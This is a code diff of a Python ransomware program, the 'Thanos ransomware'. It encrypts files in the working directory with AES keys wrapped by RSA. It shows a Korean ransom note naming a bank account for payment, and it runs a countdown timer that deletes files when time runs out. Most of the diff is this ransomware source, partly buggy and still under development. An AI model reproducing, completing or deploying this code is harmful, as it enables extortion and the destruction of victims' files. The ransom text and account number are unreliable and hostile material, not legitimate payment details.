@@ -9,22 +9,20 @@ from time import sleep
 from PIL import Image
 
 '''
-암호화 / 복호화 기존에 1,2,3 
-while 루프 나오던 건 main_test
-gui랑 통합하고 있는 게 integrate_gui 
+timer 기능X 프레임 나눠둠
+integrate_gui의 몇 함수 고침 
 '''
+
 #gui 라이브러리
 import tkinter
 from testFile import thanos
 
+#전역 변수
 iv = os.urandom(16)
 timeLimit = 5
 
-
-# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
-
-
-class tk:
+#####gui 관련 함수&코드#####
+class Tk:
     def __init__(self):
         self.window = tkinter.Tk()
         self.window.title("ransomware")
@@ -33,43 +31,68 @@ class tk:
         self.frame1 = tkinter.Frame(self.window)
         self.frame1.pack(side="left", fill="both", expand=True)
         self.frame1.configure(background="black")
-
         self.frame2 = tkinter.Frame(self.window)
         self.frame2.pack(side="right", fill="both", expand=True)
         self.frame2.configure(background="black")
 
-        self.l_text = tkinter.Label(self.frame1, text="타노스 랜섬웨어에 감염되었다.\n1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.\n국민 786102-00-040854\npassword:", fg="red", bg="black", font='Helvetica 14 bold')
-        self.l_text.pack()
-
-        self.l_input = tkinter.Label(self.frame1,
-                                    text="password:",
+        #left
+        self.l_text = tkinter.Label(self.frame1, text="타노스 랜섬웨어에 감염되었다.\n정상적으로 돌리려면 아래의 계좌로 입금해라.\n국민 786102-00-040854",
                                     fg="red", bg="black", font='Helvetica 14 bold')
-
+        self.l_text.pack()
         self.password = tkinter.Entry(self.frame1)
         self.password.pack()
-
-        self.pwbutton = tkinter.Button(self.frame1, text="복호화", command=self.key_submit)
+        self.pwbutton = tkinter.Button(self.frame1, text="키 입력", command=self.key_submit)
         self.pwbutton.pack()
 
-        '''
-        self.original = Image.open("../ui/face.png")
-        resized = self.original.resize((800,600),Image.ANTIALIAS)
-        self.thanos = tkinter.PhotoImage(resized)
-        '''
-        self.thanos = tkinter.PhotoImage(file="../ui/face.png")
+        self.l_text2 = tkinter.Label(self.frame1, text="아래의 시간 내로 입금하지 않으면 파일의 절반이 날아간다.",
+                                    fg="red", bg="black", font='Helvetica 12 bold')
+        self.l_text2.pack()
+        self.label_clock = tkinter.Label(self.frame1, text="", fg="red", bg="black", font='Helvetica 16 bold')
+        self.label_clock.pack()
 
+        #right
+        self.thanos = tkinter.PhotoImage(file="../ui/face.png")
         self.l_thanos = tkinter.Label(self.frame2, image=self.thanos)
         self.l_thanos.pack()
 
+        self.window.mainloop()
+
+    ###입력한 key값 str으로 전달###
     def key_submit(self):
         pw = str(self.password.get())
-        #self.l_input.destroy()
-        #self.l_input = tkinter.Label(self.frame1, text="키가 입력되었다 => " + pw, fg="red", bg="black", font="Helvetica 18 bold")
-        #self.l_input.pack()
-        #self.pwbutton.destroy()
+        return pw
 
-###파일 리스팅 함수##
+    ###타이머를 출력해주는 함수###
+    def clock(self, timeLimit):
+        if timeLimit < 0:
+            return
+        for i in range(timeLimit, -1, -1):
+            sleep(1)
+            self.label_clock.config(text=str(timeLimit))
 
+            if timeLimit == 0:
+                self.imagechange()
+
+    ###image 변경함수###
+    def imagechange(self):
+        # gif 출력
+        self.l_thanos.destroy()
+        self.l_thanos = thanos.AnimatedGIF(gui.frame2, "../ui/thanos1.gif")
+        self.l_thanos.pack()
+        # 다시 타노스얼굴 사진
+        sleep(2)
+        self.l_thanos.destroy()
+        self.l_thanos = tkinter.Label(gui.self.frame2, image=gui.thanos)
+        self.l_thanos.pack()
+
+
+###타이머관련함수###
+def startTimer(gui):
+    timeLimit = 5
+    gui.clock(timeLimit)
+    remove_files(os.getcwd())
+
+###파일 리스팅 함수###
 def list_files(path, ext=None):
     filelist=[]
     print("os.listdir(): \n", os.listdir())
@@ -85,32 +108,8 @@ def list_files(path, ext=None):
     print("filelist: \n", filelist)
     return filelist
 
-###타이머관련함수##
-
-def startTimer(gui):
-    timeLimit = 5
-    #print("파일 삭제를 시작합니다")
-    #5초에 한번씩 파일 삭제
-    #threading.Timer(5,remove_files(os.getcwd())).start()
-    #sleep(timeLimit)
-    clock(gui,timeLimit)
-    remove_files(gui, os.getcwd())
-
-#타이머를 출력해주는 함수 (문제: c가 계속 5로 출력됨)
-def clock(gui,timeLimit):
-    if timeLimit<=0:
-        return;
-    label_clock = tkinter.Label(gui.frame1, text=str(timeLimit), fg="red", bg="black", font='Helvetica 14 bold')
-    label_clock.pack()
-    timeLimit=timeLimit-1
-    threading.Timer(1, clock).start()
-
-def remove_files(gui,path,ext=None):
-    # 2019/11/21 수정 / gif 출력
-    gui.l_thanos.destroy()
-    gui.l_thanos = thanos.AnimatedGIF(gui.frame2, "../ui/thanos1.gif")
-    gui.l_thanos.pack()
-
+###파일삭제함수###
+def remove_files(path,ext=None):
     remove_filelist=[]
     print("os.removelistdir(): \n", os.listdir())
     for name in os.listdir(path):
@@ -145,14 +144,7 @@ def remove_files(gui,path,ext=None):
     else:
         print("더 이상 삭제할 파일이 없습니다")
 
-   #다시 타노스얼굴 사진
-    sleep(2)
-    gui.l_thanos.destroy()
-    gui.l_thanos = tkinter.Label(gui.self.frame2, image=gui.thanos)
-    gui.l_thanos.pack()
-
 ###암호화 복호화 함수###
-
 def enc(key, cipher, in_filename, out_filename=None):
 
     # RSA 로 AES 키 암호화
@@ -273,13 +265,12 @@ def dec( cipher, in_filename, out_filename):
     print("---END DECRYPTION : AES")
 
 ###메인함수###
-
 if __name__ == "__main__":
 
     key = os.urandom(16)
 
     #gui 객체 생성
-    gui = tk()
+    gui = Tk()
 
     #RSA : 키, 싸이퍼 생성
     random_generator = Random.new().read
@@ -290,12 +281,13 @@ if __name__ == "__main__":
 
 
     #timer 테스트
-    enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
-    original_targetlist = enc_targetlist#원본파일 삭제시 사용
+    enc_targetlist = list_files(os.getcwd())  # os.getcwd()는 해당 폴더에서 가져옴.
+    original_targetlist = enc_targetlist #원본파일 삭제시 사용
     # 나중에 전체 트래킹 하는 법 알아야함
-    print("enc_targetlist: \n", enc_targetlist)
-    print("original_targetlist: \n", original_targetlist)
+    #print("enc_targetlist: \n", enc_targetlist)
+    #print("original_targetlist: \n", original_targetlist)
     i = 0
+    #암호화 진행
     for enc_target in enc_targetlist:
         if enc_target.split('.')[-1] == 'antdd':
             continue
@@ -310,4 +302,3 @@ if __name__ == "__main__":
     # gui 시작 코드
     th2 = threading.Thread(gui.window.mainloop())
     th2.start()
-
